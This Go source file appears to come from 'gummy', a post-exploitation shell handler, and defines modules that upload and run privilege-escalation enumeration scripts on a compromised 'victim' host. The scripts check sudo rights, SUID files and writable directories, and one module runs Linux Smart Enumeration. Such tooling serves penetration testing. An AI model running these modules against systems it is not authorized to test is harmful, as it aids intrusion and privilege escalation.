package internal

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"

	"github.com/chsoares/gummy/internal/ui"
)

// Module interface for all gummy modules
type Module interface {
	Name() string        // Module identifier (e.g., "enum", "lse", "peas")
	Category() string    // Category (e.g., "Enumeration", "Privilege Escalation")
	Description() string // Short description
	Run(session *SessionInfo, args []string) error
}

// ModuleRegistry holds all registered modules
type ModuleRegistry struct {
	modules map[string]Module
}

var globalRegistry *ModuleRegistry

// GetModuleRegistry returns the global module registry (singleton)
func GetModuleRegistry() *ModuleRegistry {
	if globalRegistry == nil {
		globalRegistry = NewModuleRegistry()
		// Register built-in modules
		globalRegistry.Register(&EnumModule{})
		globalRegistry.Register(&LSEModule{})
	}
	return globalRegistry
}

// NewModuleRegistry creates a new module registry
func NewModuleRegistry() *ModuleRegistry {
	return &ModuleRegistry{
		modules: make(map[string]Module),
	}
}

// Register adds a module to the registry
func (r *ModuleRegistry) Register(module Module) {
	r.modules[module.Name()] = module
}

// Get retrieves a module by name
func (r *ModuleRegistry) Get(name string) (Module, bool) {
	mod, exists := r.modules[name]
	return mod, exists
}

// List returns all registered modules sorted by name
func (r *ModuleRegistry) List() []Module {
	var mods []Module
	for _, mod := range r.modules {
		mods = append(mods, mod)
	}

	// Sort by name
	sort.Slice(mods, func(i, j int) bool {
		return mods[i].Name() < mods[j].Name()
	})

	return mods
}

// ListByCategory returns all modules grouped by category
func (r *ModuleRegistry) ListByCategory() map[string][]Module {
	categories := make(map[string][]Module)

	for _, mod := range r.modules {
		cat := mod.Category()
		categories[cat] = append(categories[cat], mod)
	}

	// Sort modules within each category
	for cat := range categories {
		sort.Slice(categories[cat], func(i, j int) bool {
			return categories[cat][i].Name() < categories[cat][j].Name()
		})
	}

	return categories
}

// ============================================================================
// Built-in Modules
// ============================================================================

// EnumModule - Basic system enumeration
type EnumModule struct{}

func (m *EnumModule) Name() string        { return "enum" }
func (m *EnumModule) Category() string    { return "Enumeration" }
func (m *EnumModule) Description() string { return "Basic system enumeration (user, network, sudo, SUID)" }

func (m *EnumModule) Run(session *SessionInfo, args []string) error {
	timestamp := time.Now().Format("2006_01_02-15_04_05")
	outputPath := filepath.Join(session.ScriptsDir(), timestamp+"-enum-output.txt")

	// Basic enumeration commands
	commands := []string{
		"echo '=== System Info ==='",
		"uname -a",
		"cat /etc/os-release 2>/dev/null || cat /etc/issue",
		"echo ''",
		"echo '=== User Info ==='",
		"id",
		"whoami",
		"groups",
		"echo ''",
		"echo '=== Network ==='",
		"ip addr 2>/dev/null || ifconfig",
		"echo ''",
		"echo '=== Sudo Privileges ==='",
		"sudo -l 2>/dev/null || echo 'Cannot check sudo'",
		"echo ''",
		"echo '=== SUID Files (top 20) ==='",
		"find / -perm -4000 -type f 2>/dev/null | head -20",
		"echo ''",
		"echo '=== Writable Directories (top 20) ==='",
		"find / -writable -type d 2>/dev/null | grep -v '/proc/' | grep -v '/sys/' | head -20",
	}

	script := strings.Join(commands, "\n")

	// Save script locally
	scriptPath := filepath.Join(session.ScriptsDir(), timestamp+"-enum.sh")
	if err := os.WriteFile(scriptPath, []byte(script), 0755); err != nil {
		return fmt.Errorf("failed to write script: %w", err)
	}

	fmt.Println(ui.Success(fmt.Sprintf("Created script: %s", filepath.Base(scriptPath))))

	// Upload to victim
	fmt.Println(ui.Info("Uploading enumeration script to victim..."))
	t := NewTransferer(session.Conn, session.ID)
	ctx := context.Background()

	remotePath := "/tmp/gummy_enum.sh"
	if err := t.Upload(ctx, scriptPath, remotePath); err != nil {
		return fmt.Errorf("upload failed: %w", err)
	}

	// Make executable
	session.Handler.SendCommand(fmt.Sprintf("chmod +x %s\n", remotePath))
	time.Sleep(200 * time.Millisecond)

	// Open terminal for output
	tailCmd := fmt.Sprintf("tail -n +1 -f %s", outputPath)
	fmt.Println(ui.Info(fmt.Sprintf("Output file: %s", outputPath)))

	if err := OpenTerminal(tailCmd); err != nil {
		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
		fmt.Println(ui.Info(fmt.Sprintf("Manually run: tail -f %s", outputPath)))
	}

	// Execute remotely with streaming output
	fmt.Println(ui.Info("Executing enumeration script on victim..."))

	go func() {
		if err := session.Handler.ExecuteWithStreaming(fmt.Sprintf("bash %s", remotePath), outputPath); err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
			return
		}

		fmt.Println(ui.Success(fmt.Sprintf("Enumeration complete! Output saved to: %s", filepath.Base(outputPath))))
	}()

	return nil
}

// LSEModule - Linux Smart Enumeration
type LSEModule struct{}

func (m *LSEModule) Name() string        { return "lse" }
func (m *LSEModule) Category() string    { return "Privilege Escalation" }
func (m *LSEModule) Description() string { return "Linux Smart Enumeration (LSE)" }

func (m *LSEModule) Run(session *SessionInfo, args []string) error {
	// LSE is a single shell script
	url := "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh"

	timestamp := time.Now().Format("2006_01_02-15_04_05")
	scriptPath := filepath.Join(session.ScriptsDir(), timestamp+"-lse.sh")
	outputPath := filepath.Join(session.ScriptsDir(), timestamp+"-lse-output.txt")

	// Download
	fmt.Println(ui.Info("Downloading LSE from GitHub..."))
	if err := DownloadFile(url, scriptPath); err != nil {
		return err
	}

	// Upload
	fmt.Println(ui.Info("Uploading LSE to victim..."))
	t := NewTransferer(session.Conn, session.ID)
	remotePath := "/tmp/lse.sh"
	if err := t.Upload(context.Background(), scriptPath, remotePath); err != nil {
		return err
	}

	// Make executable
	session.Handler.SendCommand(fmt.Sprintf("chmod +x %s\n", remotePath))
	time.Sleep(200 * time.Millisecond)

	// Determine LSE level from args (default: -l1)
	level := "-l1"
	if len(args) > 0 && (args[0] == "-l0" || args[0] == "-l1" || args[0] == "-l2") {
		level = args[0]
	}

	// Open terminal
	tailCmd := fmt.Sprintf("tail -n +1 -f %s", outputPath)
	fmt.Println(ui.Info(fmt.Sprintf("Output file: %s", outputPath)))

	if err := OpenTerminal(tailCmd); err != nil {
		fmt.Println(ui.Warning(fmt.Sprintf("Terminal error: %v", err)))
		fmt.Println(ui.Info(fmt.Sprintf("Manually run: tail -f %s", outputPath)))
	}

	// Execute with streaming output
	fmt.Println(ui.Info(fmt.Sprintf("Running LSE on victim (level: %s)...", level)))

	go func() {
		if err := session.Handler.ExecuteWithStreaming(fmt.Sprintf("bash %s %s", remotePath, level), outputPath); err != nil {
			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
			return
		}

		fmt.Println(ui.Success(fmt.Sprintf("LSE complete! Output saved to: %s", filepath.Base(outputPath))))
	}()

	return nil
}
